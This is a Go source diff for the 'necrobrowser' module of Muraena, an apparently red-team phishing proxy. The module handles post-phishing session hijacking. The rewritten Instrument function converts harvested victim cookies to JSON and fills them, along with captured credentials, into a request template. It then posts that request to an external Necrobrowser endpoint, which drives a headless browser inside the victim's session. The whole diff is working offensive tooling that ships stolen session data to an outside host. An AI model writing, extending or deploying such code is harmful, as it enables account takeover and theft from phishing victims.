@@ -2,7 +2,11 @@ package necrobrowser
 
 import (
 	"encoding/json"
-	"fmt"
+	"github.com/muraenateam/muraena/core/db"
+	"github.com/muraenateam/muraena/log"
+	"io/ioutil"
+	"strings"
+	"time"
 
 	"gopkg.in/resty.v1"
 
@@ -14,10 +18,14 @@ const (
 	Name = "necrobrowser"
 
 	// Description of this module
-	Description = "Post-phishing automation that hijacks the harvested web session in a dockerized Chrome Headless"
+	Description = "Post-phishing automation via Necrobrowser-NG"
 
 	// Author of this module
 	Author = "Muraena Team"
+
+	// Placeholders for templates
+	CookiePlaceholder      = "%%%COOKIES%%%"
+	CredentialsPlaceholder = "%%%CREDENTIALS%%%"
 )
 
 // Necrobrowser module
@@ -26,38 +34,28 @@ type Necrobrowser struct {
 
 	Enabled  bool
 	Endpoint string
-	Token    string
-	Portal   string
+	Profile  string
+
+	Request string
 }
 
-type InstrumentNecrobrowser struct {
-	// gSuite, github
-	Provider string `json:"provider" binding:"required"`
-
-	DebuggingPort int `json:"debugPort" binding:"required"`
-
-	// classic credentials including 2fa token if any
-	Username string `json:"username"`
-	Password string `json:"password"`
-	Token    string `json:"token"`
-
-	// cookie jar
-	SessionCookies []SessionCookie `json:"sessionCookies"`
-
-	// keywords to search if target is a webmail or in general search bars
-	// for example: password, credentials, vpn, etc..
-	Keywords []string `json:"keywords"`
-}
-
-// SessionCookie type is needed to interact with NecroBrowser
+// Cookies
 type SessionCookie struct {
 	Name     string `json:"name"`
 	Value    string `json:"value"`
 	Domain   string `json:"domain"`
-	Expires  string `json:"expires"`
+	Expires  int64  `json:"expirationDate"`
 	Path     string `json:"path"`
 	HTTPOnly bool   `json:"httpOnly"`
 	Secure   bool   `json:"secure"`
+	Session  bool   `json:"session"`
+}
+
+// VictimCredentials structure
+type VictimCredentials struct {
+	Key   string
+	Value string
+	Time  time.Time
 }
 
 // Name returns the module name
@@ -93,21 +91,66 @@ func Load(s *session.Session) (m *Necrobrowser, err error) {
 
 	config := s.Config.NecroBrowser
 	m.Endpoint = config.Endpoint
-	m.Portal = config.Profile
-	m.Token = config.Token
+
+	m.Profile = config.Profile
+	bytes, err := ioutil.ReadFile(m.Profile)
+	if err != nil {
+		m.Warning("Error reading profile file %s: %s", m.Profile, err)
+		m.Enabled = false
+		return
+	}
+
+	m.Request = string(bytes)
+
 	return
 }
 
-func (module *Necrobrowser) InstrumentNecroBrowser(instrument *InstrumentNecrobrowser) (err error) {
+func (module *Necrobrowser) Instrument(cookieJar []db.VictimCookie, credentialsJSON string) {
 
-	b, err := json.MarshalIndent(instrument, "", "\t")
-	if err == nil {
-		module.Warning("Instrumenting NecroBrowser:")
-		module.Warning(string(b))
+	var necroCookies []SessionCookie
+	const timeLayout = "2006-01-02 15:04:05 -0700 MST"
+
+	for _, c := range cookieJar {
+
+		log.Debug("trying to parse  %s  with layout  %s", c.Expires, timeLayout)
+		t, err := time.Parse(timeLayout, c.Expires)
+		if err != nil {
+			log.Warning("warning: cant's parse Expires field (%s) of cookie %s. skipping cookie", c.Expires, c.Name)
+			continue
+		}
+
+		nc := SessionCookie{
+			Name:     c.Name,
+			Value:    c.Value,
+			Domain:   c.Domain,
+			Expires:  t.Unix(),
+			Path:     c.Path,
+			HTTPOnly: c.HTTPOnly,
+			Secure:   c.Secure,
+			Session:  t.Unix() < 1,
+		}
+
+		necroCookies = append(necroCookies, nc)
 	}
 
-	url := fmt.Sprintf("%s/%s/%s", module.Endpoint, "instrument", module.Token)
-	resp, err := resty.R().SetBody(instrument).Post(url)
+	c, err := json.MarshalIndent(necroCookies, "", "\t")
+	if err != nil {
+		module.Warning("Error marshalling the cookies: %s", err)
+		return
+	}
+
+	cookiesJSON := string(c)
+	module.Request = strings.ReplaceAll(module.Request, CookiePlaceholder, cookiesJSON)
+	module.Request = strings.ReplaceAll(module.Request, CredentialsPlaceholder, credentialsJSON)
+
+	log.Debug(" Sending to NecroBrowser cookies:\n%v", cookiesJSON)
+
+	client := resty.New()
+	resp, err := client.R().
+		SetHeader("Content-Type", "application/json").
+		SetBody(module.Request).
+		Post(module.Endpoint)
+
 	if err != nil {
 		return
 	}
